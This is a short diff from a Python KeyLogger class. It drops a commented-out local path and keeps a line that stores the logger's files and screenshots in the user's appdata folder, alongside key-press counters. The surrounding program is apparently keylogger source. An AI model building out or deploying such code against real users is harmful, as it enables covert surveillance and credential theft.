@@ -52,7 +52,6 @@ class KeyLogger():
         self.ss_enterKey_count = 0
         self.ss_deleteKey_count = 0
 
-        # self._FILE_PATH = r'E:\VISHWAS\Computer Science\Coding\Python\Projects\Keylogger'
         self._FILE_PATH = os.environ['appdata'] # Path where the required files and screenshots will be saved
 
         self._EXT = '\\'
